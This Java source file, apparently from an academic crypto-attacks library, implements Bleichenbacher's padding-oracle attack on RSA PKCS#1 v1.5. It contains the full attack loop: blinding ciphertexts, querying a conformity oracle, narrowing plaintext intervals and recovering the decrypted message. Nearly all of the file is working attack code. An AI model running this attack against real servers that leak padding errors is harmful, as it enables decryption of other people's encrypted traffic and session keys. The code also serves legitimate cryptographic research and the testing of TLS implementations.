package de.upb.syssec.cryptoattacks.pkcs15;

import de.upb.syssec.cryptoattacks.helpers.Utility;
import de.upb.syssec.cryptoattacks.pkcs15.oracles.AOracle;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

/**
 * Bleichenbacher algorithm.
 *
 * @author Christopher Meyer
 * @author Juraj Somorovsky
 *
 * May 18, 2012
 */
public class BleichenbacherAttack {

    protected final AOracle oracle;
    //protected final byte[] decryptedMsg;
    protected final byte[] encryptedMsg;
    protected final RSAPublicKey publicKey;
    protected BigInteger c0;
    protected BigInteger s0;
    protected BigInteger si;
    protected Interval[] m;
    protected final int blockSize;
    protected final BigInteger bigB;
    protected final boolean msgIsPKCS;
    boolean interruptAfterRound = true;
    AtomicBoolean interrupted;
    BigInteger solution = null;
    private int validOracleResponses;
    /**
     * Initialize the log4j logger.
     */
    static final Logger logger = LogManager.getLogger(BleichenbacherAttack.class.getName());

    public BleichenbacherAttack(final byte[] msg,
            final AOracle pkcsOracle, final boolean msgPKCScofnorm) {
        this.encryptedMsg = msg.clone();
        this.publicKey = (RSAPublicKey) pkcsOracle.getPublicKey();
        this.oracle = pkcsOracle;
        this.msgIsPKCS = msgPKCScofnorm;
        c0 = BigInteger.ZERO;
        si = BigInteger.ZERO;

        this.blockSize = oracle.getBlockSize();

        // b computation
        int tmp = publicKey.getModulus().bitLength();
        while (tmp % 8 != 0) {
            tmp++;
        }
        tmp = ((tmp / 8) - 2) * 8;
        bigB = BigInteger.valueOf(2).pow(tmp);
        logger.debug("B computed: " + bigB);
        logger.debug("Blocksize: " + blockSize);
        logger.info("Blinding step skipped --> "
                + "Message is considered as PKCS compliant.");
        s0 = BigInteger.ONE;
        c0 = new BigInteger(1, encryptedMsg);
        m = new Interval[]{
            new Interval(BigInteger.valueOf(2).multiply(bigB),
            (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};
        // we assume that we start with a PKCS1 compliant message
        validOracleResponses = 1;
        
        interrupted = new AtomicBoolean(true);
    }

    public void attack() {
        boolean solutionFound = false;
        while (!solutionFound) {
            logger.info("Step 2: Searching for PKCS conforming messages.");
            stepTwo();

            logger.info("Step 3: Narrowing the set of soultions.");
            stepThree();

            logger.info("Step 4: Computing the solution.");
            solutionFound = stepFour();
            validOracleResponses++;

            logger.info("// Total # of queries so far: " + oracle.getNumberOfQueries());

            if (interruptAfterRound) {
                interrupted.set(true);
                return;
            } else {
                try {
                    Thread.sleep(10);
                } catch (InterruptedException ie) {
                }
            }
        }

    }

    protected void stepOne() {
        BigInteger n = publicKey.getModulus();
        BigInteger ciphered = new BigInteger(1, encryptedMsg);

        boolean pkcsConform = false;
        byte[] tmp;
        byte[] send;

        do {
            si = si.add(BigInteger.ONE);
            send = prepareMsg(ciphered, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);

        c0 = new BigInteger(1, send);
        s0 = si;
        // mi = {[2B,3B-1]}
        m = new Interval[]{
            new Interval(BigInteger.valueOf(2).multiply(bigB),
            (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};

        logger.debug(" Found s0 : " + si);
    }

    protected void stepTwo() {
        byte[] send;
        boolean pkcsConform = false;
        BigInteger n = publicKey.getModulus();

        if (validOracleResponses == 1) {
            this.stepTwoA();
        } else {
            if (validOracleResponses > 1 && m.length >= 2) {
                stepTwoB();
            } else if (m.length == 1) {
                stepTwoC();
            }
        }

        logger.debug(" Found s" + validOracleResponses + ": " + si);
    }

    private void stepTwoA() {
        byte[] send;
        boolean pkcsConform = false;
        BigInteger n = publicKey.getModulus();

        logger.debug("Step 2a: Starting the search");
        // si = ceil(n/(3B))

//        BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
//        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
//            si = tmp[0].add(BigInteger.ONE);
//        } else {
//            si = tmp[0];
//        }
        si = BigInteger.valueOf(2);

        // correction will be done in do while
        si = si.subtract(BigInteger.ONE);

        do {
            si = si.add(BigInteger.ONE);
            send = prepareMsg(c0, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);
    }

    private void stepTwoB() {
        byte[] send;
        boolean pkcsConform = false;

        logger.debug("Step 2b: Searching with more than"
                + " one interval left");

        do {
            si = si.add(BigInteger.ONE);
            send = prepareMsg(c0, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);
    }

    protected void stepTwoC() {
        byte[] send;
        boolean pkcsConform = false;
        BigInteger n = publicKey.getModulus();

        logger.debug("Step 2c: Searching with one interval left");

        // initial ri computation - ri = 2(b*(si-1)-2*B)/n
        BigInteger ri = si.multiply(m[0].upper);
        ri = ri.subtract(BigInteger.valueOf(2).multiply(bigB));
        ri = ri.multiply(BigInteger.valueOf(2));
        ri = ri.divide(n);

        // initial si computation
        BigInteger upperBound = step2cComputeUpperBound(ri, n,
                m[0].lower);
        BigInteger lowerBound = step2cComputeLowerBound(ri, n,
                m[0].upper);

        // to counter .add operation in do while
        si = lowerBound.subtract(BigInteger.ONE);

        do {
            si = si.add(BigInteger.ONE);
            // lowerBound <= si < upperBound
            if (si.compareTo(upperBound) > 0) {
                // new values
                ri = ri.add(BigInteger.ONE);
                upperBound = step2cComputeUpperBound(ri, n,
                        m[0].lower);
                lowerBound = step2cComputeLowerBound(ri, n,
                        m[0].upper);
                si = lowerBound;
//                        System.out.println("slower: " + lowerBound);
//                        System.out.println("sgoal:  " + (BigInteger.valueOf(3).multiply(bigB).add(ri.multiply(n))).divide(new BigInteger(decryptedMsg)));
//                        System.out.println("supper: " + upperBound);
            }
            send = prepareMsg(c0, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);
    }

    private void stepThree() {
        BigInteger n = publicKey.getModulus();
        int upperIntervalBound;
        int lowerIntervalBound;
        BigInteger r;
        BigInteger upperBound;
        BigInteger lowerBound;
        BigInteger max;
        BigInteger min;
        BigInteger[] tmp;
        ArrayList<Interval> ms = new ArrayList<Interval>(15);

        for (Interval interval : m) {
            upperBound = step3ComputeUpperBound(si, n, interval.upper);
            lowerBound = step3ComputeLowerBound(si, n, interval.lower);

            r = lowerBound;
            // lowerBound <= r <= upperBound
            while (r.compareTo(upperBound) < 1) {
                // ceil((2*B+r*n)/si)
                max = (BigInteger.valueOf(2).multiply(bigB)).add(r.multiply(n));
                tmp = max.divideAndRemainder(si);
                if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
                    max = tmp[0].add(BigInteger.ONE);
                } else {
                    max = tmp[0];
                }

                // floor((3*B-1+r*n)/si
                min = BigInteger.valueOf(3).multiply(bigB);
                min = min.subtract(BigInteger.ONE);
                min = min.add(r.multiply(n));
                min = min.divide(si);

                // build new interval
                if (interval.lower.compareTo(max) > 0) {
                    max = interval.lower;
                }
                if (interval.upper.compareTo(min) < 0) {
                    min = interval.upper;
                }
                if (max.compareTo(min) <= 0) {
                    ms.add(new Interval(max, min));
//                    System.out.println("lower: " + max);
//                    System.out.println("goal:  " + new BigInteger(decryptedMsg));
//                    System.out.println("upper: " + min);
//                    System.out.println(" new interval for M"
//                        + i + ": [" + max + ", " + min + "]");
                }
                r = r.add(BigInteger.ONE);
            }
        }

        logger.debug(" # of intervals for M: " + ms.size());
        m = ms.toArray(new Interval[ms.size()]);
    }

    protected boolean stepFour() {
        boolean result = false;

        if (m.length == 1 && m[0].lower.compareTo(m[0].upper) == 0) {
            solution = s0.modInverse(publicKey.getModulus());
            solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());

            //if(solution.compareTo(new BigInteger(1, decryptedMsg)) == 0) {
            logger.info("====> Solution found!\n" + Utility.bytesToHex(solution.toByteArray()));
            //    System.out.println("original decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
            //}
            logger.info("// Total # of queries: "
                    + oracle.getNumberOfQueries());

            result = true;
        }

        return result;
    }

    private BigInteger step3ComputeUpperBound(final BigInteger s,
            final BigInteger modulus, final BigInteger upperIntervalBound) {
        BigInteger upperBound = upperIntervalBound.multiply(s);
        upperBound = upperBound.subtract(BigInteger.valueOf(2).multiply(bigB));
        // ceil
        BigInteger[] tmp = upperBound.divideAndRemainder(modulus);
        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
            upperBound = BigInteger.ONE.add(tmp[0]);
        } else {
            upperBound = tmp[0];
        }

        return upperBound;
    }

    private BigInteger step3ComputeLowerBound(final BigInteger s,
            final BigInteger modulus, final BigInteger lowerIntervalBound) {
        BigInteger lowerBound = lowerIntervalBound.multiply(s);
        lowerBound = lowerBound.subtract(BigInteger.valueOf(3).multiply(bigB));
        lowerBound = lowerBound.add(BigInteger.ONE);
        lowerBound = lowerBound.divide(modulus);

        return lowerBound;
    }

    protected BigInteger step2cComputeLowerBound(final BigInteger r,
            final BigInteger modulus, final BigInteger upperIntervalBound) {
        BigInteger lowerBound = BigInteger.valueOf(2).multiply(bigB);
        lowerBound = lowerBound.add(r.multiply(modulus));
        lowerBound = lowerBound.divide(upperIntervalBound);

        return lowerBound;
    }

    protected BigInteger step2cComputeUpperBound(final BigInteger r,
            final BigInteger modulus, final BigInteger lowerIntervalBound) {
        BigInteger upperBound = BigInteger.valueOf(3).multiply(bigB);
        upperBound = upperBound.add(r.multiply(modulus));
        upperBound = upperBound.divide(lowerIntervalBound);

        return upperBound;
    }

    /**
     *
     * @param originalMessage original message to be changed
     * @param si factor
     * @return
     */
    protected byte[] prepareMsg(final BigInteger originalMessage,
            final BigInteger si) {
        byte[] msg;
        BigInteger tmp;

        // if we use a real oracle (not a plaintext oracle), the si value has
        // to be encrypted first.
        if (!oracle.isPlaintextOracle()) {
            // encrypt: si^e mod n
            tmp = si.modPow(publicKey.getPublicExponent(),
                    publicKey.getModulus());
        } else {
            tmp = si;
        }

        // blind: c0*(si^e) mod n
        // or: m*si mod n (in case of plaintext oracle)
        tmp = originalMessage.multiply(tmp);
        tmp = tmp.mod(publicKey.getModulus());
        // get bytes
        msg = Utility.correctSize(tmp.toByteArray(), blockSize, true);

        return msg;
    }

    public BigInteger getSolution() {
        return solution;
    }
    
    
}
